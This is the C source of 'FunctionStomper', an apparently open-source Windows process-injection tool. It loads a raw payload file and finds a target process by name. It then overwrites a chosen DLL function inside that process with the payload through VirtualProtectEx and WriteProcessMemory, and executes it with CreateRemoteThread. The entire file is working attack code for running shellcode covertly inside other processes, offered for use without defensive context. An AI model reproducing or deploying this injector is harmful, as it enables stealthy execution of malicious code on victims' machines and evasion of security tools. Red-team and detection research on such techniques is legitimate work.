#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define PURPLE  "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RED     "\033[1;31m"
#define END     "\033[0m"

#define apierror(ApiCall)   printf("[!] " RED ApiCall " failed with error: %d\n" END, GetLastError())
#define error(msg, ...)     printf("[!] " RED msg END "\n", ##__VA_ARGS__)
#define print(msg, ...)     printf("[i] " msg "\n", ##__VA_ARGS__)

CONST CHAR Banner[] = " _____             _   _            _____ _\n"
"|   __|_ _ ___ ___| |_|_|___ ___   |   __| |_ ___ _____ ___ ___ ___\n"
"|   __| | |   |  _|  _| | . |   |  |__   |  _| . |     | . | -_|  _|\n"
"|__|  |___|_|_|___|_| |_|___|_|_|  |_____|_| |___|_|_|_|  _|___|_|\n"
"By " PURPLE "wizardy0ga" END "                                          |_|   v1.0.0\n"
"Github: " GREEN "https://github.com/wizardy0ga/RemoteFunctionStomper" END "\n"
"====================================================================\n";

// description:            Gets the pid of a remote process by name
//
// param -> lpProcessName: The name of the process to search for
// param -> dwProcessId:   A pointer to a DWORD variable to write the pid to
BOOL GetProcessPid(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId) {

    HANDLE          hSnapshot   = NULL;
    PROCESSENTRY32  Process     = {
        .dwSize = sizeof(PROCESSENTRY32)
    };

    // Get a snapshot of the current processes running on the system 
    if (!(hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0))) {
        apierror("CreateToolhelp32Snapshot");
        return FALSE;
    }

    // Populate structure with first processes data
    if (!Process32First(hSnapshot, &Process)) {
        apierror("Process32First");
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (Process.th32ProcessID && Process.szExeFile) {

            // Set process name in structure to lowercase
            CHAR    ProcNameLower[MAX_PATH];
            SIZE_T  StructProcessNameSize = lstrlenW(Process.szExeFile);
            int i = 0;
            RtlSecureZeroMemory(ProcNameLower, MAX_PATH);
            for (; i < StructProcessNameSize; i++) {
                ProcNameLower[i] = (CHAR)tolower(Process.szExeFile[i]);
            }
            ProcNameLower[i++] = '\0';

            // Check if process name matches process name given in parameter & save pid
            if (strcmp(ProcNameLower, lpProcessName) == 0) {
                *dwProcessId = Process.th32ProcessID;
                break;
            }

        }

    // Populate structure with next process in the snapshot
    } while (Process32Next(hSnapshot, &Process));

    if (hSnapshot) {
        CloseHandle(hSnapshot);
    }

    if (*dwProcessId == 0) {
        return FALSE;
    }

    return TRUE;

}

// description:             Write the payload a remote processes memory
//
// param -> hProcess        A handle to an active process on the system
// param -> pAddress        The address to write to in the remote process
// param -> pPayload        The payload to write to memory
// param -> sPayloadSize    The size of the payload in bytes
BOOL WritePayload(IN HANDLE hProcess, IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    DWORD   dwOldProtection         = 0;
    SIZE_T  sNumberOfBytesWritten   = 0;

    // Set the remote process memory block protection to read/write
    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
        apierror("VirtualAllocEx");
        return FALSE;
    }

    // Write the payload to the remote process memory block
    if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) {
        apierror("WriteProcessMemory");
        return FALSE;
    }

    print("Wrote " GREEN "%zu" END " bytes to " GREEN "0x%p" END, sNumberOfBytesWritten, pAddress);

    // Set the remote process memory block to read/execute
    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
        apierror("VirtualProtectEx");
        return FALSE;
    }

    return TRUE;
}

// description:             Read a files contents into a buffer
//
// param -> hHeap           A handle to this processes heap
// param -> lpFilePath      The path of the file to read
// param -> pBuffer         Pointer to a buffer to save the payload to
// param -> sPayloadSize    Pointer to a size_t var to save the payloads size to
BOOL ReadPayloadFile(IN HANDLE hHeap, IN LPCSTR lpFilePath, OUT LPVOID* pBuffer, OUT SIZE_T* sPayloadSize) {

    BOOL    STATUS                  = FALSE;
    HANDLE  hFile                   = NULL;
    LPVOID  pFileContents           = NULL;
    DWORD   dwFileSize              = 0;
    DWORD   dwNumberOfBytesRead     = 0;

    // Get a handle to the file
    hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        if (GetLastError() == ERROR_FILE_NOT_FOUND) {
            error("Could not get handle to %s. File not found.", lpFilePath);
        }
        else {
            apierror("CreateFile");
        }
        goto Cleanup;
    }

    // Get the size of the file
    dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) {
        apierror("GetFileSize");
        goto Cleanup;
    }

    // Allocate memory on the heap to hold the contents of the file, get pointer to allocated memory
    pFileContents = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwFileSize);
    if (pFileContents == NULL) {
        apierror("HeapAlloc");
        goto Cleanup;
    }

    // Read file contents into heap memory
    if (!ReadFile(hFile, pFileContents, dwFileSize, &dwNumberOfBytesRead, NULL)) {
        apierror("ReadFile");
        goto Cleanup;
    }

    // Make sure the number of bytes read from the file matches the initial bytes counted. Save the pointers to the out parameters.
    if (dwFileSize == dwNumberOfBytesRead) {
        *pBuffer      = pFileContents;
        *sPayloadSize = dwNumberOfBytesRead;
        STATUS        = TRUE;
        print("Read " GREEN "%d" END " bytes from %s to buffer at " GREEN "0x%p" END, dwNumberOfBytesRead, lpFilePath, pFileContents);
    }
    else if (dwFileSize != dwNumberOfBytesRead) {
        error("Got %d bytes on GetFileSize call. ReadFile returned %d number of bytes read. Payload is corrupted. Goodbye.", dwFileSize, dwNumberOfBytesRead);
        goto Cleanup;
    }

Cleanup:
    if (hFile) {
        CloseHandle(hFile);
    }
    if (pFileContents && STATUS == FALSE) {
        HeapFree(hHeap, 0, pFileContents);
    }
    return STATUS;
}

int main(int argc, char* argv[]) {

    // Validate argument count
    if (argc != 5) {
        error("Invalid amount of arguments supplied to program.");
        print("Usage: FunctionStomper.exe <" GREEN "path to payload.bin" END "> <" GREEN "target process name" END "> <" GREEN "dll name" END "> <" GREEN "function name" END ">\n");
        return EXIT_FAILURE;
    }

    BOOL    EXECUTED        = FALSE;
    DWORD   dwProcessId     = 0;
    SIZE_T  sPayloadSize    = 0;
    HMODULE hModule         = NULL;
    HANDLE  hProcess        = NULL,
            hThread         = NULL,
            hHeap           = GetProcessHeap();
    PVOID   pFuncAddress    = NULL,
            pPayload        = NULL;
    LPCSTR  PayloadFile     = argv[1],
            TargetProc      = argv[2],
            TargetDll       = argv[3],
            TargetFunc      = argv[4];

    printf(Banner);
    print("Target Process:  " CYAN "%s"   END, TargetProc);
    print("Target DLL:      " CYAN "%s"   END, TargetDll);
    print("Target Function: " CYAN "%s\n" END, TargetFunc);

    if (hHeap == NULL) {
        apierror("GetProcessHeap");
        goto Cleanup;
    }

    // Read the payload from the .bin file
    if (!ReadPayloadFile(hHeap, PayloadFile, &pPayload, &sPayloadSize)) {
        goto Cleanup;
    }

    // Get a pid to the target process
    if (!GetProcessPid(TargetProc, &dwProcessId)) {
        error("Failed to get pid for %s. Process does not exist.", TargetProc);
        goto Cleanup;
    }
    print("Located %s " END "at pid: " GREEN "%d" END, TargetProc, dwProcessId);

    // Open a handle to the process
    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId))) {
        apierror("OpenProcess");
        goto Cleanup;
    }
    print("Got handle to %s", TargetProc);

    // Load the target library into this process
    if (!(hModule = LoadLibraryA(TargetDll))) {
        if (GetLastError() == ERROR_MOD_NOT_FOUND) {
            error("Could not find module %s", TargetDll);
        }
        else {
            apierror("LoadLibraryA");
        }
        goto Cleanup;
    }
    print("Got handle to %s" END, TargetDll);

    // Get the address of the targeted function in the library
    if (!(pFuncAddress = GetProcAddress(hModule, TargetFunc))) {
        if (GetLastError() == ERROR_PROC_NOT_FOUND) {
            error("Could not find function %s in %s", TargetFunc, TargetDll);
        }
        else {
            apierror("GetProcAddress");
        }
        goto Cleanup;
    }
    print("Found %s at " GREEN "0x%p" END " in %s!%s", TargetFunc, pFuncAddress, TargetProc, TargetDll);

    // Overwrite the functions code with the payload in the target process
    if (!WritePayload(hProcess, pFuncAddress, (PBYTE)pPayload, sPayloadSize)) {
        goto Cleanup;
    }

    // Create thread in the remote process to execute the payload
    if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, pFuncAddress, NULL, 0, NULL))) {
        apierror("CreateRemoteThread");
        goto Cleanup;
    }
    print(GREEN "Executed payload!" END);
    EXECUTED = TRUE;

    // Wait for thread to finish
    WaitForSingleObject(hThread, INFINITE);

    print("Press enter to quit");
    getchar();

// Cleanup open handles & process heap
Cleanup:
    if (hProcess) {
        CloseHandle(hProcess);
    }
    if (hModule) {
        CloseHandle(hModule);
    }
    if (hThread) {
        CloseHandle(hThread);
    }
    if (pPayload) {
        HeapFree(hHeap, 0, pPayload);
    } 
    if (hHeap) {
        CloseHandle(hHeap);
    }
    if (EXECUTED) {
        return EXIT_SUCCESS;
    }
    else {
        return EXIT_FAILURE;
    }
}